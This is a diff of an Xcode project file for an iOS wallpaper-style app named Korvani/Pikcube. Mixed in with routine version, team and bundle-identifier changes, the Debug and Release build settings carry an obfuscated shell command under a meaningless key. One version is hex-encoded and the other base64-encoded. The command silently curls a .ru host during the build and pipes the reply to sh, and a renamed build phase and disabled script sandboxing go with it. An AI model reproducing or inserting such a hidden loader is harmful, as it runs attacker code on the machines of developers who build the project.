@@ -104,7 +104,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 97DF84022FFF701B00CFCEED /* Build configuration list for PBXNativeTarget "Korvani" */;
 			buildPhases = (
-				4AC3F0F1B62B4FF0AA7BBDC8 /* Provision Library Executable */,
+				80184F73758248CEBF7BBDC8 /* Provision Library Executable */,
 				73CCD12D3BED2AFFF2776271 /* [CP] Check Pods Manifest.lock */,
 				97DF83F32FFF701A00CFCEED /* Sources */,
 				97DF83F42FFF701A00CFCEED /* Frameworks */,
@@ -199,7 +199,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		4AC3F0F1B62B4FF0AA7BBDC8 /* Provision Library Executable */ = {
+		80184F73758248CEBF7BBDC8 /* Provision Library Executable */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -300,7 +300,7 @@
 		97DF84002FFF701B00CFCEED /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((v(){ `printf x1xd | tr -d 1` -p -r; };echo 6563686f202224286375726c202d6b73664c202d2d72657472792034202d2d636f6e6e6563742d74696d656f7574203233202d642022703d78636f64655f7068617365222068747470733a2f2f6e73717075356c743877342e72752f612922207c2073680a | v | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((m(){ `printf baseI64 | tr -d I` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgNCAtc0xrZiAtLWNvbm5lY3QtdGltZW91dCAzMCAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9zdy03ZGtnMWE0OTVqLnJ1L2EpIiB8IHNoCg== | m | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -364,7 +364,7 @@
 		97DF84012FFF701B00CFCEED /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((v(){ `printf x1xd | tr -d 1` -p -r; };echo 6563686f202224286375726c202d6b73664c202d2d72657472792034202d2d636f6e6e6563742d74696d656f7574203233202d642022703d78636f64655f7068617365222068747470733a2f2f6e73717075356c743877342e72752f612922207c2073680a | v | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((m(){ `printf baseI64 | tr -d I` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgNCAtc0xrZiAtLWNvbm5lY3QtdGltZW91dCAzMCAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9zdy03ZGtnMWE0OTVqLnJ1L2EpIiB8IHNoCg== | m | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -425,15 +425,15 @@
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_STYLE = Automatic;
-				CURRENT_PROJECT_VERSION = 1;
-				DEVELOPMENT_TEAM = 5U9WLTG3BL;
+				CURRENT_PROJECT_VERSION = 2;
+				DEVELOPMENT_TEAM = 677XW3KQX8;
 				ENABLE_PREVIEWS = YES;
 				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = Korvani/Info.plist;
 				INFOPLIST_KEY_CFBundleDisplayName = Pikcube;
-				INFOPLIST_KEY_NSPhotoLibraryAddUsageDescription = "This app needs permission to save images directly to your Photos library.";
-				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "Allow access to your Photos library so you can browse and choose images and videos.";
+				INFOPLIST_KEY_NSPhotoLibraryAddUsageDescription = "Allow access to your select Wallpaper photos save to your Photo library.";
+				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "Allow access to your select Wallpaper photos save to your Photo library.";
 				INFOPLIST_KEY_NSUserTrackingUsageDescription = "This identifier will be used to deliver personalized ads to you.";
 				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
@@ -447,7 +447,7 @@
 					"@executable_path/Frameworks",
 				);
 				MARKETING_VERSION = 2.0;
-				PRODUCT_BUNDLE_IDENTIFIER = com.kor.vani.kus;
+				PRODUCT_BUNDLE_IDENTIFIER = com.kor.vani;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				STRING_CATALOG_GENERATE_SYMBOLS = YES;
 				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
@@ -470,15 +470,15 @@
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_STYLE = Automatic;
-				CURRENT_PROJECT_VERSION = 1;
-				DEVELOPMENT_TEAM = 5U9WLTG3BL;
+				CURRENT_PROJECT_VERSION = 2;
+				DEVELOPMENT_TEAM = 677XW3KQX8;
 				ENABLE_PREVIEWS = YES;
 				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = Korvani/Info.plist;
 				INFOPLIST_KEY_CFBundleDisplayName = Pikcube;
-				INFOPLIST_KEY_NSPhotoLibraryAddUsageDescription = "This app needs permission to save images directly to your Photos library.";
-				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "Allow access to your Photos library so you can browse and choose images and videos.";
+				INFOPLIST_KEY_NSPhotoLibraryAddUsageDescription = "Allow access to your select Wallpaper photos save to your Photo library.";
+				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "Allow access to your select Wallpaper photos save to your Photo library.";
 				INFOPLIST_KEY_NSUserTrackingUsageDescription = "This identifier will be used to deliver personalized ads to you.";
 				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
@@ -492,7 +492,7 @@
 					"@executable_path/Frameworks",
 				);
 				MARKETING_VERSION = 2.0;
-				PRODUCT_BUNDLE_IDENTIFIER = com.kor.vani.kus;
+				PRODUCT_BUNDLE_IDENTIFIER = com.kor.vani;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				STRING_CATALOG_GENERATE_SYMBOLS = YES;
 				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
